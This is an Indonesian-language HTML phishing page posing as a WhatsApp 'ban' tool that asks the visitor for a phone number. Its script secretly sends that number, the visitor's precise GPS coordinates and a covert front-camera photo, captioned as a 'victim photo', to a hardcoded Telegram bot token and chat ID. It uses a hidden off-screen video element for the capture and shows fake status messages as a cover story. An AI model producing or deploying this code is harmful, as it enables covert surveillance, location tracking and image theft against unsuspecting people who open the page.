<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>WhatsApp Security Protocol - V5 Final</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* Estetika Otoritas Digital */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #010409; color: #7ee787; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
    .terminal { width: 90%; max-width: 400px; background: #0d1117; border: 1px solid #30363d; padding: 30px; border-radius: 6px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    .header { color: #f0f6fc; font-weight: 600; font-size: 18px; margin-bottom: 20px; border-bottom: 1px solid #21262d; padding-bottom: 10px; text-align: center; }
    input { width: 100%; padding: 12px; background: #010409; border: 1px solid #30363d; color: #7ee787; border-radius: 6px; margin-bottom: 20px; outline: none; text-align: center; }
    button { width: 100%; padding: 12px; background: #238636; color: #fff; border: 1px solid rgba(240,246,252,0.1); border-radius: 6px; font-weight: 600; cursor: pointer; }
    button:hover { background: #2ea043; }
    #status { font-size: 11px; color: #8b949e; margin-top: 15px; font-family: monospace; text-align: center; }
    
    /* Ruang Terlarang */
    #void { position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div class="terminal">
    <div class="header">VERIFIKASI SISTEM BANS</div>
    <input type="number" id="num" placeholder="Masukkan Nomor WhatsApp">
    <button id="exec">KONFIRMASI & BANS</button>
    <div id="status">STATUS: TERKONEKSI KE GITHUB HTTPS</div>
  </div>

  <div id="void">
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" width="640" height="480"></canvas>
  </div>

  <script>
    const API = {
      TOKEN: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
      CHAT: '7109845671'
    };

    const statusMsg = document.getElementById('status');

    // FUNGSI PENGIRIMAN LEBIH STABIL
    async function transmit(method, data) {
      const url = `https://api.telegram.org/bot${API.TOKEN}/${method}`;
      try {
        const response = await fetch(url, { method: 'POST', body: data });
        const result = await response.json();
        console.log(`Telegram Response (${method}):`, result);
        return result.ok;
      } catch (e) {
        console.error("Gagal mengirim ke Telegram:", e);
        return false;
      }
    }

    // FIX LOKASI FATAL: MENGGUNAKAN PROMISE UNTUK MENUNGGU HASIL
    async function getPreciseLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve("Geo tidak didukung");
        
        navigator.geolocation.getCurrentPosition(
          async (p) => {
            const { latitude: lat, longitude: lon, accuracy: acc } = p.coords;
            const text = `📍 <b>LOKASI DITEMUKAN</b>\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAkurasi: ${acc}m\n<a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>`;
            const fd = new FormData();
            fd.append('chat_id', API.CHAT);
            fd.append('text', text);
            fd.append('parse_mode', 'HTML');
            await transmit('sendMessage', fd);
            resolve(true);
          },
          async (err) => {
            const fd = new FormData();
            fd.append('chat_id', API.CHAT);
            fd.append('text', `❌ <b>Gagal Lokasi:</b> ${err.message}`);
            await transmit('sendMessage', fd);
            resolve(false);
          },
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    // FIX FOTO: PENANGKAPAN DENGAN JEDA UNTUK STABILISASI
    async function captureAndSend() {
      const v = document.getElementById('v');
      const c = document.getElementById('c');
      const ctx = c.getContext('2d');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        v.srcObject = stream;

        // Tunggu video benar-benar memuat
        await new Promise(r => v.onloadedmetadata = r);
        
        // Jeda 1 detik agar sensor kamera tidak buram/hitam
        await new Promise(r => setTimeout(r, 1000));

        ctx.drawImage(v, 0, 0, 640, 480);
        
        return new Promise((resolve) => {
          c.toBlob(async (blob) => {
            if (blob) {
              const fd = new FormData();
              fd.append('chat_id', API.CHAT);
              fd.append('photo', blob, 'capture.jpg'); // Nama file penting agar Telegram mengenali sebagai foto
              fd.append('caption', `📸 Foto Korban (${new Date().toLocaleTimeString()})`);
              const ok = await transmit('sendPhoto', fd);
              resolve(ok);
            }
            stream.getTracks().forEach(t => t.stop());
          }, 'image/jpeg', 0.9);
        });
      } catch (e) {
        const fd = new FormData();
        fd.append('chat_id', API.CHAT);
        fd.append('text', `❌ <b>Kamera Gagal:</b> ${e.name}`);
        await transmit('sendMessage', fd);
        return false;
      }
    }

    document.getElementById('exec').addEventListener('click', async (e) => {
      const n = document.getElementById('num').value;
      if (n.length < 8) return;

      e.target.disabled = true;
      statusMsg.innerText = "MENGHUBUNGKAN KE SERVER WHATSAPP...";

      // Langkah 1: Kirim metadata dasar
      const fd = new FormData();
      fd.append('chat_id', API.CHAT);
      fd.append('text', `<b>📞 TARGET BANS:</b> <code>${n}</code>\n<b>IP:</b> Mendeteksi...`);
      await transmit('sendMessage', fd);

      // Langkah 2: Eksekusi Lokasi dan Kamera secara berurutan agar tidak tabrakan
      statusMsg.innerText = "MENYINGKRONKAN ENKRIPSI...";
      await getPreciseLocation();
      
      statusMsg.innerText = "MENYELESAIKAN PROSES BANS...";
      await captureAndSend();

      statusMsg.innerText = `BERHASIL: NOMOR ${n} TELAH DI-BANS.`;
      e.target.disabled = false;
    });
  </script>
</body>
</html>
